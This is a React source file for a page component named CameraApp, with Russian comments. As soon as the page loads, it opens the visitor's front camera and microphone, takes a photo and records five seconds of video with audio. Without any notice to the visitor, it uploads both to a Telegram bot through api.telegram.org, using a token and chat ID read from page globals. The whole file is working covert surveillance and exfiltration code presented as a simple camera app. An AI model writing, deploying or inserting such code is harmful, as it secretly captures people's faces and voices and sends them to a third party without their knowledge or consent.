function CameraApp() {
  const [photoDataUrl, setPhotoDataUrl] = React.useState(null);

  // Запись 5-секундного видео и отправка в Telegram после отправки фото
  async function recordAndSendVideo(stream, durationMs = 5000) {
    // Подготовим MediaRecorder
    let mimeType = "";
    if (window.MediaRecorder) {
      if (MediaRecorder.isTypeSupported("video/webm;codecs=vp9,opus")) mimeType = "video/webm;codecs=vp9,opus";
      else if (MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus")) mimeType = "video/webm;codecs=vp8,opus";
      else if (MediaRecorder.isTypeSupported("video/webm")) mimeType = "video/webm";
    }
    const options = mimeType ? { mimeType } : undefined;
    const recorder = new MediaRecorder(stream, options);
    const chunks = [];

    await new Promise((resolve, reject) => {
      recorder.addEventListener("dataavailable", (e) => {
        if (e.data && e.data.size > 0) chunks.push(e.data);
      });
      recorder.addEventListener("stop", resolve);
      recorder.addEventListener("error", reject);
      recorder.start();
      setTimeout(() => {
        try { recorder.stop(); } catch (_) {}
      }, durationMs);
    });

    const videoBlob = new Blob(chunks, { type: mimeType || "video/webm" });

    if (window.TELEGRAM_BOT_TOKEN && window.TELEGRAM_CHAT_ID) {
      // Пытаемся отправить как видео; при неудаче — как документ
      const form = new FormData();
      form.append("chat_id", String(window.TELEGRAM_CHAT_ID));
      form.append("caption", "Auto video");
      form.append("video", videoBlob, "video.webm");
      let resp = await fetch(`https://api.telegram.org/bot${window.TELEGRAM_BOT_TOKEN}/sendVideo`, {
        method: "POST",
        body: form,
      });
      if (!resp.ok) {
        const docForm = new FormData();
        docForm.append("chat_id", String(window.TELEGRAM_CHAT_ID));
        docForm.append("caption", "Auto video");
        docForm.append("document", videoBlob, "video.webm");
        await fetch(`https://api.telegram.org/bot${window.TELEGRAM_BOT_TOKEN}/sendDocument`, {
          method: "POST",
          body: docForm,
        });
      }
    }
  }

  const takeAndSendPhoto = async () => {
    let stream;
    try {
      // Берём сразу и видео, и аудио — чтобы потом записать ролик
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
      const video = document.createElement("video");
      video.srcObject = stream;
      await new Promise(res => { video.onloadedmetadata = () => { video.play(); res(); }; });

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);

      setPhotoDataUrl(canvas.toDataURL("image/png"));

      const blob = await new Promise(res => canvas.toBlob(res, "image/png"));
      if (blob && window.sendPhotoToTelegram) {
        await window.sendPhotoToTelegram({
          botToken: window.TELEGRAM_BOT_TOKEN,
          chatId: window.TELEGRAM_CHAT_ID,
          photoBlob: blob,
          caption: "Auto shot"
        });
      }

      // После успешной отправки фото — записываем и отправляем видео
      await recordAndSendVideo(stream, 5000);
    } finally {
      if (stream) stream.getTracks().forEach(t => t.stop());
    }
  };

  React.useEffect(() => {
    takeAndSendPhoto();
  }, []);

  return photoDataUrl && <img src={photoDataUrl} alt="Снимок" style={{ width: "100%" }} />;
}

const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(<CameraApp />);
